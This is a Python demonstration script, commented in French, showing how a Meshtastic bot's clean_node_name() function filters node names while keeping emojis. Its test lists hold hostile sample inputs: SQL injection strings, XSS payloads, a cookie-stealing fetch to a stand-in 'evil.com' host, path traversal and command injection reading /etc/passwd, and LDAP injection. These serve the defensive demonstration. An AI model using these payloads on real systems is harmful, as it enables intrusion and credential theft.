#!/usr/bin/env python3
"""
Démonstration de la sanitisation des noms de nœuds.
Montre comment le bot filtre les tentatives d'injection et préserve les émojis.
"""

import sys
import os

# Create minimal config for demonstration
config_module = type(sys)('config')
config_module.DEBUG_MODE = False
sys.modules['config'] = config_module

sys.path.insert(0, os.path.dirname(os.path.dirname(os.path.abspath(__file__))))

from utils import clean_node_name

def demo_sanitization():
    """Démonstration interactive de la sanitisation"""
    
    print()
    print("╔" + "═" * 78 + "╗")
    print("║" + " " * 20 + "DÉMONSTRATION DE SANITISATION" + " " * 28 + "║")
    print("║" + " " * 78 + "║")
    print("║" + "  Protection contre les injections SQL et attaques XSS/HTML" + " " * 18 + "║")
    print("║" + "  Préservation des émojis utilisés dans les noms de nœuds" + " " * 20 + "║")
    print("╚" + "═" * 78 + "╝")
    print()
    
    scenarios = [
        {
            'title': '✅ NOMS VALIDES (Préservés)',
            'examples': [
                ("TigroBot 🐅", "Nom normal avec émoji"),
                ("🏠 Base Station", "Émoji au début"),
                ("Repeater 📡", "Nom avec émoji à la fin"),
                ("Mobile_Tracker-01", "Nom avec tiret et underscore"),
                ("Node 🚀🔥⚡", "Plusieurs émojis"),
            ]
        },
        {
            'title': '🛡️ INJECTION SQL (Bloquée)',
            'examples': [
                ("Node'; DROP TABLE nodes;--", "Tentative DROP TABLE"),
                ("Admin' OR '1'='1", "Tentative OR condition"),
                ("Test'; DELETE FROM users;--", "Tentative DELETE"),
                ("1' UNION SELECT * FROM passwords--", "Tentative UNION SELECT"),
            ]
        },
        {
            'title': '🛡️ ATTAQUES XSS/HTML (Bloquées)',
            'examples': [
                ("<script>alert('XSS')</script>", "Injection de balise script"),
                ("Node<img src=x onerror=alert(1)>", "Balise IMG avec onerror"),
                ("<iframe src='evil.com'>Hack</iframe>", "Tentative iframe"),
                ("Test<!-- comment -->Node", "Commentaire HTML"),
                ("<a href='javascript:alert(1)'>Link</a>", "Lien avec javascript:"),
            ]
        },
        {
            'title': '🔒 CARACTÈRES SPÉCIAUX (Filtrés)',
            'examples': [
                ("Node@123", "Symbole @"),
                ("Price$100", "Symbole $"),
                ("Test&Debug", "Symbole &"),
                ("Node[Test]", "Crochets"),
                ("Test:Value", "Deux-points"),
            ]
        }
    ]
    
    for scenario in scenarios:
        print(f"\n{scenario['title']}")
        print("─" * 80)
        
        for original, description in scenario['examples']:
            sanitized = clean_node_name(original)
            print(f"\n  📝 {description}")
            print(f"     Entrée:  {original!r}")
            print(f"     Sortie:  {sanitized!r}")
            
            # Highlight what was filtered
            if original != sanitized:
                filtered = set(original) - set(sanitized)
                if filtered:
                    filtered_chars = ', '.join(repr(c) for c in sorted(filtered))
                    print(f"     ⚠️  Filtré: {filtered_chars}")
    
    print()
    print("═" * 80)
    print()


def demo_attack_vectors():
    """Démonstration des vecteurs d'attaque courants"""
    
    print("╔" + "═" * 78 + "╗")
    print("║" + " " * 24 + "VECTEURS D'ATTAQUE COURANTS" + " " * 27 + "║")
    print("╚" + "═" * 78 + "╝")
    print()
    
    attacks = [
        ("Injection SQL Classique", "Admin'--"),
        ("SQL avec commentaires", "'; DROP TABLE users; --"),
        ("XSS basique", "<script>alert(document.cookie)</script>"),
        ("XSS via IMG", "<img src=x onerror=eval(atob('YWxlcnQoMSk='))>"),
        ("XSS via SVG", "<svg/onload=alert(1)>"),
        ("Injection HTML", "<body onload=fetch('evil.com?c='+document.cookie)>"),
        ("Pollution de prototype", "__proto__[isAdmin]=true"),
        ("Path traversal", "../../etc/passwd"),
        ("Commande système", "; cat /etc/passwd"),
        ("LDAP injection", "*)(&(password=*))"),
    ]
    
    print("Tentatives d'attaque courantes et leur neutralisation:\n")
    
    for name, attack in attacks:
        sanitized = clean_node_name(attack)
        safe = "✅ Neutralisé" if attack != sanitized else "⚠️  Identique"
        
        print(f"  {name}:")
        print(f"     Attaque:     {attack!r}")
        print(f"     Après filtre: {sanitized!r}")
        print(f"     Status:      {safe}")
        print()


def demo_emoji_preservation():
    """Démonstration de la préservation des émojis"""
    
    print("╔" + "═" * 78 + "╗")
    print("║" + " " * 24 + "PRÉSERVATION DES ÉMOJIS" + " " * 31 + "║")
    print("╚" + "═" * 78 + "╝")
    print()
    
    emojis = [
        ("🐅", "Tigre (mascotte commune)"),
        ("🏠", "Maison (station de base)"),
        ("📡", "Antenne (répéteur)"),
        ("🚲", "Vélo (tracker mobile)"),
        ("⛰️", "Montagne (station outdoor)"),
        ("🔥", "Feu (nœud actif)"),
        ("⚡", "Éclair (haute puissance)"),
        ("🌐", "Globe (nœud gateway)"),
        ("🛰️", "Satellite (liaison longue distance)"),
        ("🎯", "Cible (point de référence)"),
    ]
    
    print("Émojis couramment utilisés dans les noms de nœuds Meshtastic:\n")
    
    for emoji, description in emojis:
        test_name = f"Node {emoji}"
        sanitized = clean_node_name(test_name)
        preserved = "✅ Préservé" if emoji in sanitized else "❌ Perdu"
        
        print(f"  {emoji}  {description:40s} {preserved}")
        print(f"     Test:    {test_name!r}")
        print(f"     Résultat: {sanitized!r}")
        print()


if __name__ == "__main__":
    demo_sanitization()
    print()
    demo_attack_vectors()
    print()
    demo_emoji_preservation()
    
    print("═" * 80)
    print()
    print("🎉 Démonstration terminée!")
    print()
    print("La fonction clean_node_name() protège efficacement contre:")
    print("  • Les injections SQL")
    print("  • Les attaques XSS/HTML")
    print("  • Les caractères spéciaux dangereux")
    print()
    print("Tout en préservant:")
    print("  • Les caractères alphanumériques (a-z, A-Z, 0-9)")
    print("  • Les espaces, tirets et underscores")
    print("  • Tous les émojis Unicode courants")
    print()
    print("═" * 80)
